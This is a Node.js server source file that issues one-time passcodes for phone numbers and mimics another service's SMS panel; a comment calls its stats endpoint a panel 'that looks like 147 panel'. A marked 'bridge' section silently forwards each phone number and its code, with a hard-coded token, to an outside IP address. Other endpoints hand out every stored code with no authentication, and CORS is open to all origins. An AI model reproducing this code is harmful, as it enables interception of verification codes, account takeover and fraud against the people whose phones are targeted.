const http = require('http');
const https = require('https');

const otpStore = new Map();
const VALID_TOKEN = 'RFZVSURBUzRcZIdddZBoe0pQkotEaVNlgndka3RSh2tHZGNSfIyUag==';

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  const url = req.url;

  // 1. VIEWSTATS PANEL - Your own panel that looks like 147 panel
  if (url.startsWith('/crapi/st/viewstats') && req.method === 'GET') {
    const urlObj = new URL(req.url, `http://${req.headers.host}`);
    const token = urlObj.searchParams.get('token');
    const records = parseInt(urlObj.searchParams.get('records') || '10');
    
    if (token !== VALID_TOKEN) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Invalid token' }));
      return;
    }

    const all = [];
    for (let [phone, data] of otpStore.entries()) {
      all.push({
        phone: phone,
        number: phone,
        otp: data.code,
        code: data.code,
        message: data.code,
        expires: new Date(data.expires).toISOString(),
        status: Date.now() < data.expires ? 'active' : 'expired',
        active: Date.now() < data.expires
      });
    }
    
    const limited = all.reverse().slice(0, records);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      token: token,
      total: all.length,
      records: limited.length,
      data: limited,
      otps: limited
    }));
    return;
  }

  // 2. SEND OTP - THIS IS WHERE THAT BRIDGE CODE GOES
  if (url.startsWith('/api/send-otp') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const { phone } = JSON.parse(body);
        if (!phone) throw new Error('No phone');

        const otp = Math.floor(100000 + Math.random() * 900000).toString();
        const expires = Date.now() + 5 * 60 * 1000;
        
        // SAVE TO YOUR STORE
        otpStore.set(phone, { code: otp, expires });
        console.log(`OTP ${otp} for ${phone}`);

        // >>>>>>>>>>>>> COPY THE BRIDGE HERE - START <<<<<<<<<<<<<<
        try {
          const targetNumber = phone;
          const otpCode = otp;
          // This pushes OTP to 147 panel if they have inbox API
          await fetch(`http://147.135.212.197/crapi/st/receive?token=${VALID_TOKEN}&number=${targetNumber}&message=${otpCode}&code=${otpCode}`, { 
            signal: AbortSignal.timeout(5000) 
          }).catch(()=>{});
          
          // Also try alternative endpoints
          await fetch(`http://147.135.212.197/crapi/st/add?token=${VALID_TOKEN}&phone=${targetNumber}&otp=${otpCode}`, { 
            signal: AbortSignal.timeout(5000) 
          }).catch(()=>{});
        } catch(e){
          console.log('Bridge error', e.message);
        }
        // >>>>>>>>>>>>> COPY THE BRIDGE HERE - END <<<<<<<<<<<<<<

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, otp, phone, expires: new Date(expires).toISOString() }));
      } catch(e) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // 3. GET OTPS
  if (url.startsWith('/api/otps') && req.method === 'GET') {
    const all = [];
    for (let [phone, data] of otpStore.entries()) {
      all.push({ phone, code: data.code, expires: new Date(data.expires).toISOString(), active: Date.now() < data.expires });
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, total: all.length, otps: all }));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Not found' }));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));
